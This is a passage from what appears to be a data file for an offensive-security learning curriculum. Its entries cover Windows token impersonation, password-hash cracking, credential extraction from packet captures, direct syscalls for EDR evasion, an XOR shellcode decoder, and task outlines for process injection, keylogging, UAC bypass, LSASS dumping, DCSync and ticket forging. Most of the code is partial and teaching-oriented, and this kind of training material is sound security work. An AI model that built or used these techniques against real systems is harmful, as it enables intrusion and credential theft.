      { title: 'Token Manipulator', description: 'Open token, query privileges, impersonate', details: '## Overview\nManipulate Windows access tokens for privilege escalation and impersonation.\n\n### Implementation\n```csharp\n[DllImport("advapi32.dll", SetLastError = true)]\nstatic extern bool OpenProcessToken(IntPtr hProcess, uint access, out IntPtr hToken);\n\n[DllImport("advapi32.dll", SetLastError = true)]\nstatic extern bool AdjustTokenPrivileges(IntPtr hToken, bool disableAll,\n    ref TOKEN_PRIVILEGES newState, int bufLen, IntPtr prev, IntPtr retLen);\n\n[DllImport("advapi32.dll", SetLastError = true)]\nstatic extern bool ImpersonateLoggedOnUser(IntPtr hToken);\n\npublic static void EnablePrivilege(string privilege) {\n    OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0028, out var token);\n    // Lookup privilege LUID, build TOKEN_PRIVILEGES struct\n    // Call AdjustTokenPrivileges\n}\n```\n\n### Key Concepts\n- Windows token architecture\n- Privilege constants (SeDebugPrivilege, etc.)\n- Token impersonation levels\n- Primary vs impersonation tokens\n\n### Practice\n- [ ] Open and query process tokens\n- [ ] Enable SeDebugPrivilege\n- [ ] List all token privileges\n- [ ] Impersonate another user\n\n### Completion Criteria\n- [ ] Query token privileges\n- [ ] Enable/disable privileges\n- [ ] Impersonation working' }
    ]
  },
  {
    name: 'Phase 0: Python Foundation',
    description: 'Rapid prototyping, Impacket, protocol implementation',
    tasks: [
      { title: 'Network Scanner', description: 'ARP scan with Scapy, MAC vendor lookup', details: '## Overview\nBuild a network scanner for host discovery using ARP requests.\n\n### Implementation\n```python\nfrom scapy.all import ARP, Ether, srp\nimport ipaddress\n\ndef arp_scan(network):\n    """Scan network range for live hosts."""\n    arp = ARP(pdst=str(network))\n    ether = Ether(dst="ff:ff:ff:ff:ff:ff")\n    packet = ether/arp\n    \n    result = srp(packet, timeout=2, verbose=0)[0]\n    \n    hosts = []\n    for sent, received in result:\n        hosts.append({\n            "ip": received.psrc,\n            "mac": received.hwsrc,\n            "vendor": lookup_vendor(received.hwsrc)\n        })\n    return hosts\n\n# Usage: arp_scan(ipaddress.ip_network("192.168.1.0/24"))\n```\n\n### Key Concepts\n- Scapy packet crafting\n- ARP protocol for layer 2 discovery\n- MAC OUI vendor lookup\n- CIDR notation and IP ranges\n\n### Practice\n- [ ] Implement ARP scanning with Scapy\n- [ ] Look up MAC vendor from OUI database\n- [ ] Support CIDR network ranges\n- [ ] Add concurrent scanning\n\n### Completion Criteria\n- [ ] Discover all hosts on subnet\n- [ ] Display MAC and vendor info\n- [ ] Handle large ranges efficiently' },
      { title: 'Password Cracker', description: 'Dictionary attack on MD5/SHA1/NTLM', details: '## Overview\nBuild a multi-threaded password cracker for common hash types.\n\n### Implementation\n```python\nimport hashlib\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef ntlm_hash(password):\n    return hashlib.new("md4", password.encode("utf-16le")).hexdigest()\n\ndef crack_hash(target_hash, hash_type, wordlist_path):\n    hash_funcs = {\n        "md5": lambda p: hashlib.md5(p.encode()).hexdigest(),\n        "sha1": lambda p: hashlib.sha1(p.encode()).hexdigest(),\n        "ntlm": ntlm_hash,\n    }\n    hash_func = hash_funcs[hash_type]\n    \n    with open(wordlist_path, "r", errors="ignore") as f:\n        for word in f:\n            word = word.strip()\n            if hash_func(word) == target_hash.lower():\n                return word\n    return None\n```\n\n### Key Concepts\n- Hashlib for hash computation\n- NTLM hash format (MD4 of UTF-16LE)\n- Threading for parallelization\n- Wordlist handling and rules\n\n### Practice\n- [ ] Implement MD5/SHA1/NTLM hashing\n- [ ] Multi-threaded wordlist attack\n- [ ] Add progress reporting\n- [ ] Support hash file input\n\n### Completion Criteria\n- [ ] Crack common hash types\n- [ ] Efficient wordlist processing\n- [ ] Clear output with statistics' },
      { title: 'Web Scraper', description: 'Extract links, forms, detect technologies', details: '## Overview\nBuild a web scraper for reconnaissance - extracting links, forms, and detecting technologies.\n\n### Implementation\n```python\nimport requests\nfrom bs4 import BeautifulSoup\nfrom urllib.parse import urljoin\n\ndef scrape_page(url):\n    session = requests.Session()\n    resp = session.get(url, allow_redirects=True)\n    soup = BeautifulSoup(resp.text, "html.parser")\n    \n    # Extract links\n    links = set()\n    for a in soup.find_all("a", href=True):\n        links.add(urljoin(url, a["href"]))\n    \n    # Extract forms\n    forms = []\n    for form in soup.find_all("form"):\n        forms.append({\n            "action": urljoin(url, form.get("action", "")),\n            "method": form.get("method", "get").upper(),\n            "inputs": [i.get("name") for i in form.find_all("input")]\n        })\n    \n    return {"links": links, "forms": forms}\n```\n\n### Key Concepts\n- Requests for HTTP handling\n- BeautifulSoup for HTML parsing\n- URL normalization and joining\n- Cookie and session management\n\n### Practice\n- [ ] Extract all links from page\n- [ ] Parse forms with inputs\n- [ ] Detect common technologies\n- [ ] Handle authentication\n\n### Completion Criteria\n- [ ] Complete link extraction\n- [ ] Form parsing working\n- [ ] Cookies maintained across requests' },
      { title: 'PCAP Analyzer', description: 'Parse PCAP, extract credentials', details: '## Overview\nAnalyze packet captures to extract credentials and sensitive data.\n\n### Implementation\n```python\nfrom scapy.all import rdpcap, TCP, Raw\nimport re\n\ndef extract_http_creds(pcap_file):\n    packets = rdpcap(pcap_file)\n    creds = []\n    \n    for pkt in packets:\n        if pkt.haslayer(TCP) and pkt.haslayer(Raw):\n            payload = pkt[Raw].load.decode("utf-8", errors="ignore")\n            \n            # HTTP Basic Auth\n            auth_match = re.search(r"Authorization: Basic (\\S+)", payload)\n            if auth_match:\n                import base64\n                decoded = base64.b64decode(auth_match.group(1)).decode()\n                creds.append(("HTTP Basic", decoded))\n            \n            # Form POST data\n            if "POST" in payload and ("password" in payload.lower() or "pass" in payload.lower()):\n                creds.append(("HTTP POST", payload.split("\\r\\n\\r\\n")[-1]))\n    \n    return creds\n```\n\n### Key Concepts\n- PCAP file format and parsing\n- TCP stream reassembly\n- Protocol-specific credential patterns\n- Base64 decoding for HTTP auth\n\n### Practice\n- [ ] Parse PCAP files with Scapy\n- [ ] Extract HTTP credentials\n- [ ] Find FTP/Telnet cleartext\n- [ ] Reassemble TCP streams\n\n### Completion Criteria\n- [ ] Parse large PCAP files\n- [ ] Extract common credential types\n- [ ] Report findings clearly' },
      { title: 'Impacket Exploration', description: 'Study secretsdump.py, write SMB tool', details: '## Overview\nStudy Impacket library internals and implement simplified versions of key tools.\n\n### Implementation\n```python\nfrom impacket.smbconnection import SMBConnection\nfrom impacket.dcerpc.v5 import transport, srvs\n\ndef list_shares(target, username, password, domain=""):\n    """Enumerate SMB shares on target."""\n    conn = SMBConnection(target, target)\n    conn.login(username, password, domain)\n    \n    shares = conn.listShares()\n    for share in shares:\n        name = share["shi1_netname"][:-1]  # Remove null terminator\n        print(f"Share: {name}")\n        try:\n            conn.listPath(name, "*")\n            print(f"  [Readable]")\n        except:\n            print(f"  [Access Denied]")\n    \n    conn.close()\n```\n\n### Key Concepts\n- Impacket library architecture\n- SMB protocol and share enumeration\n- DCERPC for remote services\n- Credential handling patterns\n\n### Practice\n- [ ] Study secretsdump.py source code\n- [ ] Implement share enumeration\n- [ ] Build simplified SMB client\n- [ ] Understand DCERPC transports\n\n### Completion Criteria\n- [ ] Understand Impacket architecture\n- [ ] Working share enumeration\n- [ ] Can extend for custom tools' },
      { title: 'NTLM Implementation', description: 'Build Type 1/2/3 messages from scratch', details: '## Overview\nImplement NTLM authentication protocol from scratch to understand the handshake.\n\n### Implementation\n```python\nimport hashlib\nimport hmac\nimport struct\n\ndef ntlm_hash(password):\n    """Compute NTLM hash (MD4 of UTF-16LE password)."""\n    return hashlib.new("md4", password.encode("utf-16le")).digest()\n\ndef build_type1_message(domain="", workstation=""):\n    """Build NTLM Type 1 (Negotiate) message."""\n    signature = b"NTLMSSP\\x00"\n    msg_type = struct.pack("<I", 1)\n    flags = struct.pack("<I", 0x00088207)  # Negotiate flags\n    # Domain and workstation fields...\n    return signature + msg_type + flags + ...\n\ndef build_type3_response(nt_hash, server_challenge, username, domain):\n    """Build NTLM Type 3 (Authenticate) message."""\n    # Compute NTLMv2 response\n    nt_hash_v2 = hmac.new(nt_hash, (username.upper() + domain).encode("utf-16le"), "md5").digest()\n    # Build response...\n```\n\n### Key Concepts\n- NTLM message structure (Type 1/2/3)\n- NTLMv1 vs NTLMv2 computation\n- Challenge-response mechanism\n- Flags and negotiation\n\n### Practice\n- [ ] Compute NTLM hashes\n- [ ] Build Type 1 negotiate message\n- [ ] Parse Type 2 challenge\n- [ ] Build Type 3 authenticate response\n\n### Completion Criteria\n- [ ] Manual NTLM auth working\n- [ ] Understand each message type\n- [ ] Can debug NTLM issues' },
      { title: 'Kerberos Toolkit', description: 'Build AS-REQ, parse AS-REP', details: '## Overview\nImplement Kerberos AS-REQ/AS-REP to understand the authentication protocol.\n\n### Implementation\n```python\nfrom pyasn1.type import univ, tag\nfrom pyasn1.codec.der import encoder, decoder\nimport socket\n\ndef build_as_req(username, domain):\n    """Build Kerberos AS-REQ packet."""\n    # KDC-REQ-BODY\n    kdc_req_body = univ.Sequence()\n    # Add principal name (client)\n    # Add realm\n    # Add request time, nonce, etype list\n    # Add pre-authentication data\n    \n    # Wrap in AS-REQ\n    as_req = univ.Sequence()\n    as_req.setComponentByPosition(0, univ.Integer(5))  # pvno\n    as_req.setComponentByPosition(1, univ.Integer(10))  # msg-type (AS-REQ)\n    # ...\n    return encoder.encode(as_req)\n\ndef send_to_kdc(domain, packet):\n    """Send packet to KDC on port 88."""\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((domain, 88))\n    sock.send(struct.pack(">I", len(packet)) + packet)\n    # Receive and parse response...\n```\n\n### Key Concepts\n- Kerberos protocol flow\n- ASN.1 DER encoding\n- AS-REQ and AS-REP structure\n- Pre-authentication types\n\n### Practice\n- [ ] Build AS-REQ with pyasn1\n- [ ] Send to KDC and receive AS-REP\n- [ ] Parse AS-REP for ticket\n- [ ] Extract encrypted data for cracking\n\n### Completion Criteria\n- [ ] Manual AS-REQ building works\n- [ ] Understand ASN.1 structure\n- [ ] Can request TGT from KDC' },
      { title: 'Mini Impacket', description: 'DCERPC connection, call RPC method', details: '## Overview\nImplement DCERPC from scratch to understand Windows RPC internals.\n\n### Implementation\n```python\nimport struct\nfrom impacket.dcerpc.v5 import transport\nfrom impacket.dcerpc.v5.ndr import NDRCALL\n\n# DCERPC bind packet structure\ndef build_bind_packet(interface_uuid, interface_version):\n    """Build DCERPC BIND packet."""\n    # PDU header (version, type, flags, etc.)\n    header = struct.pack("<BBBBHHHI",\n        5, 0,     # Version 5.0\n        11,       # BIND packet type\n        0x03,     # Flags (first + last frag)\n        0x10,     # Data representation\n        0,        # Frag length (fill later)\n        0,        # Auth length\n        0)        # Call ID\n    # Context list, interface UUID, transfer syntax...\n    return header + ...\n\n# Example: Call NetrServerGetInfo\ndef call_server_info(target, username, password):\n    stringbinding = f"ncacn_np:{target}[\\\\pipe\\\\srvsvc]"\n    rpctransport = transport.DCERPCTransportFactory(stringbinding)\n    rpctransport.set_credentials(username, password, "")\n    dce = rpctransport.get_dce_rpc()\n    dce.connect()\n    dce.bind(srvs.MSRPC_UUID_SRVS)\n    # Make call...\n```\n\n### Key Concepts\n- DCERPC protocol structure\n- Named pipe transports\n- NDR encoding for parameters\n- Interface UUIDs and methods\n\n### Practice\n- [ ] Build DCERPC BIND manually\n- [ ] Connect via named pipe\n- [ ] Call NetrServerGetInfo\n- [ ] Parse NDR response\n\n### Completion Criteria\n- [ ] Understand DCERPC packet format\n- [ ] Manual RPC call working\n- [ ] Can implement new RPC methods' }
    ]
  },
  {
    name: 'Phase 0: Assembly Foundation',
    description: 'Shellcode, CPU execution, minimal footprint',
    tasks: [
      { title: 'Function Calls', description: 'Call Windows API from assembly', details: '## Overview\nLearn to call Windows APIs directly from x64 assembly using the Microsoft calling convention.\n\n### Implementation\n```asm\n; x64 Windows calling convention:\n; Args: RCX, RDX, R8, R9, then stack (right to left)\n; Must allocate 32 bytes shadow space\n; Return value in RAX\n\nsection .data\n    title db "Hello", 0\n    msg db "Hello World!", 0\n\nsection .text\nextern MessageBoxA\nglobal main\n\nmain:\n    sub rsp, 40         ; Shadow space (32) + alignment (8)\n    xor rcx, rcx        ; hWnd = NULL\n    lea rdx, [msg]      ; lpText\n    lea r8, [title]     ; lpCaption  \n    xor r9, r9          ; uType = MB_OK\n    call MessageBoxA\n    add rsp, 40\n    ret\n```\n\n### Key Concepts\n- x64 calling convention (rcx, rdx, r8, r9)\n- Shadow space (32 bytes for callee)\n- Stack alignment (16-byte boundary)\n- Register preservation rules\n\n### Practice\n- [ ] Call MessageBoxA with "Hello World"\n- [ ] Master shadow space allocation\n- [ ] Call functions with >4 arguments\n- [ ] Link with Windows libraries\n\n### Completion Criteria\n- [ ] MessageBox displays correctly\n- [ ] No crashes from misalignment\n- [ ] Understand calling convention fully' },
      { title: 'Loop and Conditionals', description: 'Sum array, find max, string length', details: '## Overview\nMaster control flow and memory access patterns in x64 assembly.\n\n### Implementation\n```asm\n; Sum array of integers\n; RCX = pointer to array, RDX = count\nsum_array:\n    xor rax, rax        ; sum = 0\n    test rdx, rdx       ; check if count == 0\n    jz .done\n.loop:\n    add eax, [rcx]      ; sum += *arr\n    add rcx, 4          ; arr++\n    dec rdx             ; count--\n    jnz .loop           ; if count != 0, continue\n.done:\n    ret\n\n; String length (null-terminated)\nstrlen:\n    xor rax, rax        ; length = 0\n.loop:\n    cmp byte [rcx + rax], 0\n    je .done\n    inc rax\n    jmp .loop\n.done:\n    ret\n```\n\n### Key Concepts\n- JMP, JZ, JNZ, JE, JNE conditionals\n- LOOP instruction and manual loops\n- FLAGS register (ZF, CF, SF, OF)\n- Effective address calculations\n\n### Practice\n- [ ] Implement array sum\n- [ ] Find maximum in array\n- [ ] Implement strlen manually\n- [ ] Use flags for comparisons\n\n### Completion Criteria\n- [ ] Loops work correctly\n- [ ] Handle empty arrays/strings\n- [ ] Efficient memory access patterns' },
      { title: 'Syscall Direct', description: 'NtAllocateVirtualMemory without imports', details: '## Overview\nCall NT syscalls directly without going through ntdll - foundation for EDR evasion.\n\n### Implementation\n```asm\n; Direct syscall to NtAllocateVirtualMemory\n; Syscall number varies by Windows version (0x18 on Win10 21H2)\n\nNtAllocateVirtualMemory:\n    mov r10, rcx        ; NtAllocateVirtualMemory convention\n    mov eax, 0x18       ; Syscall number (version dependent!)\n    syscall\n    ret\n\n; Usage:\n;   RCX = ProcessHandle (-1 for current)\n;   RDX = *BaseAddress\n;   R8 = ZeroBits\n;   R9 = *RegionSize\n;   [RSP+28h] = AllocationType\n;   [RSP+30h] = Protect\n```\n\n### Key Concepts\n- Syscall instruction and SSDT\n- Syscall numbers per Windows version\n- Parameter passing for NT functions\n- Avoiding ntdll hooks\n\n### Practice\n- [ ] Find syscall numbers dynamically\n- [ ] Call NtAllocateVirtualMemory directly\n- [ ] Call NtWriteVirtualMemory directly\n- [ ] Create shellcode with no imports\n\n### Completion Criteria\n- [ ] Syscalls work without ntdll\n- [ ] Dynamic syscall number resolution\n- [ ] Understand version differences' },
      { title: 'PEB Walking', description: 'Find kernel32 from TEB->PEB', details: '## Overview\nNavigate Windows internal structures to find loaded DLLs without API calls.\n\n### Implementation\n```asm\n; x64: TEB at gs:[0], PEB at gs:[0x60]\n; x86: TEB at fs:[0], PEB at fs:[0x30]\n\nfind_kernel32:\n    xor rax, rax\n    mov rax, gs:[0x60]          ; RAX = PEB\n    mov rax, [rax + 0x18]       ; RAX = PEB->Ldr\n    mov rax, [rax + 0x20]       ; RAX = InMemoryOrderModuleList.Flink\n    \n    ; First entry is ntdll, second is kernel32 (usually)\n    mov rax, [rax]              ; Skip ntdll\n    mov rax, [rax + 0x20]       ; RAX = DllBase of kernel32\n    ret\n\n; More robust: walk list and check DLL name\nwalk_modules:\n    ; Compare BaseDllName against "KERNEL32.DLL"\n    ; Unicode comparison needed\n```\n\n### Key Concepts\n- TEB and PEB structures\n- InMemoryOrderModuleList\n- LDR_DATA_TABLE_ENTRY structure\n- Unicode string comparison\n\n### Practice\n- [ ] Access PEB from TEB\n- [ ] Walk InMemoryOrderModuleList\n- [ ] Find kernel32.dll by name\n- [ ] Handle position-independence\n\n### Completion Criteria\n- [ ] Find kernel32 base address\n- [ ] Works on all Windows versions\n- [ ] No hardcoded offsets for DLL name' },
      { title: 'API Hashing', description: 'Resolve functions by hash at runtime', details: '## Overview\nResolve Windows APIs by hash instead of name - avoid string detection in shellcode.\n\n### Implementation\n```asm\n; ROR13 hash commonly used in shellcode\n; Hash "LoadLibraryA" = 0x0726774C\n\nror13_hash:\n    ; RCX = pointer to string\n    xor rax, rax            ; hash = 0\n    xor rdx, rdx\n.loop:\n    mov dl, [rcx]\n    test dl, dl\n    jz .done\n    ror eax, 13             ; Rotate right 13 bits\n    add eax, edx\n    inc rcx\n    jmp .loop\n.done:\n    ret\n\n; Find function by hash in export table\nfind_export_by_hash:\n    ; RCX = DLL base, RDX = target hash\n    ; Walk PE export table, hash each name, compare\n```\n\n### Key Concepts\n- ROR13 hashing algorithm\n- PE export table structure\n- AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals\n- Hash collision handling\n\n### Practice\n- [ ] Implement ROR13 hash\n- [ ] Parse PE export table\n- [ ] Find function by hash\n- [ ] Resolve LoadLibraryA and GetProcAddress\n\n### Completion Criteria\n- [ ] Hash computation matches tools\n- [ ] Export resolution working\n- [ ] No cleartext API names in code' },
      { title: 'Shellcode Stub', description: 'Null-free, self-modifying decoder', details: '## Overview\nCreate a decoder stub that decrypts encoded shellcode at runtime - essential for evasion.\n\n### Implementation\n```asm\n; XOR decoder stub (null-free)\n; Assumes payload follows immediately after stub\n\n_start:\n    jmp get_payload\n\ndecoder:\n    pop rsi                 ; RSI = payload address\n    xor rcx, rcx\n    mov cl, PAYLOAD_LEN     ; Avoid null if len < 256\n    \ndecode_loop:\n    xor byte [rsi], 0x41    ; XOR key (avoid null)\n    inc rsi\n    loop decode_loop\n    \n    jmp payload\n\nget_payload:\n    call decoder            ; Push payload address\npayload:\n    ; Encoded payload bytes here\n    db 0x11, 0x22, ...      ; XOR-encoded shellcode\n```\n\n### Key Concepts\n- Null byte avoidance techniques\n- Position-independent shellcode\n- Self-modifying code patterns\n- Encoder/decoder stubs\n\n### Practice\n- [ ] Write null-free decoder\n- [ ] XOR encode payload\n- [ ] Test position independence\n- [ ] Add polymorphic variations\n\n### Completion Criteria\n- [ ] No null bytes in stub\n- [ ] Payload decodes correctly\n- [ ] Works at any memory address' }
    ]
  },
  // Phase 1: Process and Memory
  {
    name: 'Phase 1: Process & Memory',
    description: 'Process enumeration, DLL enumeration, memory manipulation, keylogging',
    tasks: [
      { title: 'Process Enumerator', description: 'Reimplementing tasklist.exe with user context and integrity level', details: '## Overview\nEnumerate all processes with detailed information.\n\n### APIs\n- CreateToolhelp32Snapshot\n- Process32First/Next\n- OpenProcessToken, GetTokenInformation\n\n### Tasks\n- [ ] Basic PID and name enumeration (C++)\n- [ ] Add parent process relationship\n- [ ] Add user/SID resolution\n- [ ] Add integrity level detection\n- [ ] Reimplement with NtQuerySystemInformation (C/ASM)' },
      { title: 'DLL Enumerator', description: 'Reimplementing listdlls.exe - PEB walking', details: '## Overview\nList loaded modules for any process.\n\n### Methods\n- EnumProcessModules (PSAPI)\n- Manual PEB walking via NtQueryInformationProcess\n\n### Tasks\n- [ ] PSAPI enumeration (C++)\n- [ ] Manual PEB walking (C)\n- [ ] Detect hidden modules\n- [ ] Hash computation per module' },
      { title: 'Memory Reader/Writer', description: 'Core Cheat Engine functionality', details: '## Overview\nCross-process memory access.\n\n### APIs\n- ReadProcessMemory, WriteProcessMemory\n- VirtualQueryEx, VirtualProtectEx\n\n### Tasks\n- [ ] Read arbitrary memory\n- [ ] Write arbitrary memory\n- [ ] Enumerate memory regions\n- [ ] Pattern scanning' },
      { title: 'Simple Keylogger', description: 'SetWindowsHookEx and GetAsyncKeyState methods', details: '## Overview\nCapture keystrokes with window context.\n\n### Methods\n- WH_KEYBOARD_LL hook\n- GetAsyncKeyState polling\n- Raw Input API\n\n### Tasks\n- [ ] Hook implementation (C++)\n- [ ] Foreground window context\n- [ ] Special key handling\n- [ ] Clipboard monitoring' }
    ]
  },
  // Phase 1.5: Reconnaissance
  {
    name: 'Phase 1.5: Reconnaissance',
    description: 'Network discovery, port scanning, service enumeration',
    tasks: [
      { title: 'Network Discovery Scanner', description: 'ARP scan, ICMP sweep, TCP SYN', details: '## Tasks\n- [ ] ARP scanner (Go)\n- [ ] ICMP ping sweep\n- [ ] Raw socket TCP SYN\n- [ ] NetBIOS name resolution' },
      { title: 'Port Scanner', description: 'TCP connect, SYN scan, service detection', details: '## Tasks\n- [ ] TCP connect scanner (Go)\n- [ ] Banner grabbing\n- [ ] SYN scanner (Rust)\n- [ ] Service fingerprinting' },
      { title: 'SMB Share Enumerator', description: 'List shares, check permissions, find sensitive files', details: '## Tasks\n- [ ] Enumerate shares (Go)\n- [ ] Check read/write access\n- [ ] Sensitive file patterns\n- [ ] Multi-host scanning' },
      { title: 'Service Enumerator', description: 'RPC enumeration - SAMR, LSAR, SRVS', details: '## Tasks\n- [ ] Enumerate users (Python)\n- [ ] Groups and memberships\n- [ ] Password policy\n- [ ] Handle null session' },
      { title: 'Internal Web Discovery', description: 'Screenshot web services, detect technologies', details: '## Tasks\n- [ ] HTTP/HTTPS probe (Go)\n- [ ] Title/header extraction\n- [ ] Screenshot with headless Chrome\n- [ ] Technology fingerprinting' },
      { title: 'DNS Reconnaissance', description: 'Zone transfer, reverse lookup, SRV records', details: '## Tasks\n- [ ] Zone transfer attempt\n- [ ] Reverse DNS sweep\n- [ ] SRV record enumeration for AD\n- [ ] DNS-based DC discovery' }
    ]
  },
  // Phase 2: Code Injection
  {
    name: 'Phase 2: Code Injection',
    description: 'DLL injection, shellcode injection, process hollowing, APC injection',
    tasks: [
      { title: 'Classic DLL Injection', description: 'VirtualAllocEx + WriteProcessMemory + CreateRemoteThread', details: '## Overview\nFundamental injection technique.\n\n### Steps\n1. OpenProcess\n2. VirtualAllocEx - allocate in target\n3. WriteProcessMemory - write DLL path\n4. CreateRemoteThread - call LoadLibrary\n\n### Tasks\n- [ ] Basic injection (C++)\n- [ ] Handle 32/64-bit differences\n- [ ] NtCreateThreadEx variant (C)' },
      { title: 'Shellcode Injection', description: 'Position-independent code execution', details: '## Overview\nExecute shellcode in remote process.\n\n### Better pattern (avoid RWX)\n1. VirtualAllocEx(PAGE_READWRITE)\n2. WriteProcessMemory\n3. VirtualProtectEx(PAGE_EXECUTE_READ)\n4. CreateRemoteThread\n\n### Tasks\n- [ ] Local shellcode execution\n- [ ] Remote injection\n- [ ] XOR encoded shellcode (Rust)' },
      { title: 'Process Hollowing', description: 'CreateProcess suspended, unmap, write new image', details: '## Overview\nReplace process image in memory.\n\n### Steps\n1. CreateProcess(CREATE_SUSPENDED)\n2. NtUnmapViewOfSection\n3. VirtualAllocEx at preferred base\n4. Write headers and sections\n5. Set entry point, ResumeThread\n\n### Tasks\n- [ ] Parse PE manually (C)\n- [ ] Basic process hollowing\n- [ ] Handle relocations' },
      { title: 'Thread Hijacking', description: 'Suspend thread, modify context, execute code', details: '## Overview\nHijack existing thread for execution.\n\n### Steps\n1. SuspendThread\n2. GetThreadContext\n3. Write shellcode\n4. SetThreadContext (RIP to shellcode)\n5. ResumeThread\n\n### Tasks\n- [ ] Basic thread hijacking (C++)\n- [ ] Shellcode that restores execution\n- [ ] Target specific threads' },
      { title: 'APC Injection', description: 'QueueUserAPC for code execution', details: '## Overview\nAsynchronous Procedure Calls for injection.\n\n### Tasks\n- [ ] Basic APC injection\n- [ ] Early bird APC\n- [ ] NtQueueApcThread variant\n- [ ] Alertable state detection' },
      { title: 'Module Stomping', description: 'Overwrite legitimate DLL .text section', details: '## Overview\nHide in legitimate module memory.\n\n### Concept\n- Load legitimate signed DLL\n- Overwrite .text with shellcode\n- Execute from "legitimate" memory\n\n### Tasks\n- [ ] Local module stomping (C++)\n- [ ] Remote process stomping\n- [ ] Verify against memory scanners' }
    ]
  },
  // Phase 2.5: Privilege Escalation
  {
    name: 'Phase 2.5: Privilege Escalation',
    description: 'Service misconfigs, UAC bypass, token abuse, DLL hijacking',
    tasks: [
      { title: 'Service Misconfiguration Scanner', description: 'Unquoted paths, weak permissions', details: '## Checks\n- Unquoted service paths\n- Weak binary permissions\n- Weak service configuration permissions\n- Services running as SYSTEM\n\n### Tasks\n- [ ] Enumerate services with configs (C#)\n- [ ] Check unquoted paths\n- [ ] Check binary permissions (Go)\n- [ ] Check service DACL' },
      { title: 'Registry Privilege Escalation', description: 'AlwaysInstallElevated, autorun locations', details: '## Tasks\n- [ ] Check AlwaysInstallElevated\n- [ ] Enumerate autorun locations\n- [ ] Check registry key permissions\n- [ ] MSI payload generator' },
      { title: 'UAC Bypass Techniques', description: 'fodhelper, eventvwr, mock directories', details: '## Bypasses\n- fodhelper.exe\n- eventvwr.exe\n- computerdefaults.exe\n- CMSTP.exe\n\n### Tasks\n- [ ] Fodhelper bypass (C#)\n- [ ] Eventvwr bypass\n- [ ] Mock trusted directory (C++)\n- [ ] Modular bypass framework' },
      { title: 'Token Privilege Abuse', description: 'SeDebug, SeBackup, SeRestore, Potatoes', details: '## Abusable Privileges\n- SeImpersonatePrivilege (Potato)\n- SeBackupPrivilege (read any file)\n- SeRestorePrivilege (write any file)\n- SeDebugPrivilege (any process)\n\n### Tasks\n- [ ] Check privileges (C++)\n- [ ] SeBackupPrivilege file read\n- [ ] PrintSpoofer implementation (Rust)\n- [ ] Named pipe impersonation' },
      { title: 'DLL Hijacking for Privesc', description: 'Find missing DLLs in privileged processes', details: '## Tasks\n- [ ] Scan for missing DLLs (Go)\n- [ ] Check PATH permissions\n- [ ] Create proxy DLL (C++)\n- [ ] Automated payload deployment' },
      { title: 'Scheduled Task Privilege Escalation', description: 'Writable tasks running as SYSTEM', details: '## Tasks\n- [ ] Enumerate scheduled tasks (C#)\n- [ ] Check task binary permissions\n- [ ] Find SYSTEM tasks with writable components\n- [ ] Automated scanner (Go)' }
    ]
  },
  // Phase 3: Credential Access
  {
    name: 'Phase 3: Credential Access',
    description: 'SAM dumping, LSASS, token manipulation, Kerberos tickets, DCSync',
    tasks: [
      { title: 'SAM Database Dumper', description: 'Extract boot key, decrypt SAM entries', details: '## Steps\n1. Extract boot key from SYSTEM hive\n2. Decrypt SAM entries\n3. Extract NTLM hashes\n\n### Tasks\n- [ ] Extract boot key (Python)\n- [ ] Parse SAM structure\n- [ ] Decrypt NTLM hashes\n- [ ] Standalone offline parser (Go)' },
      { title: 'LSASS Memory Dumper', description: 'MiniDumpWriteDump and manual approaches', details: '## Overview\nExtract credentials from LSASS memory.\n\n### Tasks\n- [ ] MiniDump approach (C#)\n- [ ] Manual dump without MiniDumpWriteDump (C++)\n- [ ] Parse dump offline (Python)\n- [ ] Handle Credential Guard/PPL' },
      { title: 'Token Manipulation', description: 'Enumerate, steal, impersonate tokens', details: '## Tasks\n- [ ] Enumerate accessible tokens (C++)\n- [ ] Identify unique users/privileges (C#)\n- [ ] Steal and impersonate token\n- [ ] Create process with stolen token' },
      { title: 'Kerberos Ticket Extractor', description: 'LSA API ticket extraction', details: '## Tasks\n- [ ] List cached tickets (C#)\n- [ ] Extract ticket details\n- [ ] Export in kirbi format\n- [ ] Export in ccache format (Python)\n- [ ] Implement ticket import' },
      { title: 'DCSync Implementation', description: 'MS-DRSR protocol for credential replication', details: '## Overview\nReplicate credentials from domain controller.\n\n### Prerequisites\n- Replicating Directory Changes rights\n- Replicating Directory Changes All rights\n\n### Tasks\n- [ ] RPC connection to DC (Python)\n- [ ] DRSBind authentication\n- [ ] DRSGetNCChanges for single user\n- [ ] Full domain dump (Go)' }
    ]
  },
  // Phase 4: Active Directory Attacks
  {
    name: 'Phase 4: Active Directory',
    description: 'LDAP enumeration, Kerberoasting, AS-REP roasting, ticket forging',
    tasks: [
      { title: 'LDAP Domain Enumeration', description: 'Users, groups, computers, SPNs, ACLs', details: '## Key Queries\n- Users: (objectClass=user)\n- Domain Admins\n- Unconstrained delegation\n- Constrained delegation\n- SPNs for Kerberoasting\n\n### Tasks\n- [ ] Basic LDAP enumeration (C#)\n- [ ] Find privileged accounts\n- [ ] Find delegation configs\n- [ ] Parse ACLs for attack paths\n- [ ] BloodHound JSON output' },
      { title: 'Kerberoasting Tool', description: 'Request TGS for SPN accounts, extract hashes', details: '## Steps\n1. Query LDAP for users with SPNs\n2. Request TGS for each SPN\n3. Extract encrypted portion\n4. Format for hashcat/john\n\n### Tasks\n- [ ] Find kerberoastable users (C#)\n- [ ] Request TGS (LSA API)\n- [ ] Raw Kerberos request (Python)\n- [ ] Output in hashcat format (13100)' },
      { title: 'AS-REP Roasting Tool', description: 'Users without pre-authentication required', details: '## Tasks\n- [ ] Find AS-REP roastable users via LDAP\n- [ ] Craft AS-REQ without pre-auth (Python)\n- [ ] Parse AS-REP response\n- [ ] Output in hashcat format (18200)' },
      { title: 'Password Spraying Tool', description: 'LDAP/Kerberos based with safety limits', details: '## Tasks\n- [ ] Query domain password policy\n- [ ] LDAP-based spray (Go)\n- [ ] Kerberos-based spray\n- [ ] Detect/handle lockouts\n- [ ] Proper timing and jitter' },
      { title: 'Silver Ticket Generator', description: 'Forge service tickets with arbitrary PAC', details: '## Requirements\n- Service account NTLM hash\n- Domain SID\n- Target SPN\n\n### Tasks\n- [ ] Construct valid PAC (Python)\n- [ ] Add arbitrary group memberships (C#)\n- [ ] Encrypt and sign properly\n- [ ] Export in usable format' },
